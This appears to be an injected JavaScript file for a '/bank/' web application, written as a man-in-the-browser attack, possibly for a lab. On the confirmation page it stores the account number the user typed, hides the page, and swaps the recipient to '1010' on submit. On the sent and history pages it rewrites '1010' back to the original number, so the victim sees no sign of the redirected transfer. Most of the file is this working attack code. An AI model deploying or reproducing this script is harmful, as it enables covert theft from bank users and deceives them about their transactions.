console.log("h4ck3d");
document.getElementsByTagName("BODY")[0].style.visibility = "hidden";
document.onreadystatechange = function(e)
{
    if (document.readyState === 'complete')
    {
        //dom is ready, window.onload fires later
		
			
    }
};
$(document).ready(function(){
	//alert(location.pathname);
	if (location.pathname == "/bank/" || location.pathname == "/bank/index.php") {
		
	} else if (location.pathname == "/bank/form.php") {
		var nick = $('#nick').text();
		var table = [1];
		if (localStorage.getItem(nick) === null) {
			localStorage.setItem(nick, JSON.stringify(table));
			console.log("localStorage set");
		} else {
			console.log(localStorage.length);
		}
		/*//if (window.jQuery) {
			//alert(location.pathname);

			/*for (var i = 0; i < localStorage.length; i++){
					console.log(localStorage.getItem(localStorage.key(i)));
				}*

		//}
		/*$("#pr").text("h4ck");
		$('#form1').submit(function() {
			$('#accnr').val('1010');
			//$('#accnr').attr('value', '1010');

			//alert($('#accnr').val());
			return true;
		});*/
	} else if (location.pathname == "/bank/confirm.php") {
		var nick = $('#nick').text();
		var table = JSON.parse(localStorage.getItem(nick));
		//var accNr = $('#accnr').val()
		//console.log(accNr);
		//table.unshift({accBefore: $('#accnr').val()});
		console.table(table);
		//alert(nick);
		//$("#accnr1").val('54321');
		
		$('#confirmform').submit(function() {
			table.unshift({accBefore: $('#accnr').val()});
			console.table(table);
			localStorage.setItem(nick, JSON.stringify(table));
			document.getElementsByTagName("BODY")[0].style.visibility = "hidden";
			$('#accnr').val('1010');
			
			return true;
		});
	} else if (location.pathname == "/bank/sent.php") {
		var nick = $('#nick').text();
		var table = JSON.parse(localStorage.getItem(nick));
		//var tblobj = $('#senttable');
		//console.table(tbl);
		//console.log($('#senttable').innerHTML);
		var accnrcell = document.getElementById('senttable').rows[1].cells[1];
		if(accnrcell.innerHTML == "1010"){
			console.log(accnrcell.innerHTML);
			accnrcell.innerHTML = table[0].accBefore;
		}
		
		/*var table = $('#senttable');
		var data = [];

		// first row needs to be headers
		/*var headers = [];
		for (var i=0; i<table.rows[0].cells.length; i++) {
			headers[i] = table.rows[0].cells[i].innerHTML.toLowerCase().replace(/ /gi,'');
		}*
		
		var tableRow = table.rows[1];
		var rowData = {};

		for (var j=0; j<tableRow.cells.length; j++) {

			rowData[ headers[j] ] = tableRow.cells[j].innerHTML;

		}

		data.push(rowData);
		*/    

			
	} else if (location.pathname == "/bank/history.php") {
		var nick = $('#nick').text();
		var table = JSON.parse(localStorage.getItem(nick));
		var histtab = document.getElementById("historytable");
		
		var actrow = 1;
		var acttabrow = 0;
		while(histtab.rows[actrow] != undefined){
			if(histtab.rows[actrow].cells[1].innerHTML == "1010"){
				histtab.rows[actrow].cells[1].innerHTML = table[acttabrow].accBefore;
				acttabrow++;
			}
			actrow++;
		}
	}
	document.getElementsByTagName("BODY")[0].style.visibility = "visible";
});
window.onload = function(e)
{
    //document.readyState will be complete, it's one of the requirements for the window.onload event to be fired
    //do stuff for when everything is loaded
	
	//alert("wtf");
	
	
	//setTimeout("alert('hello world');", 1);
	
};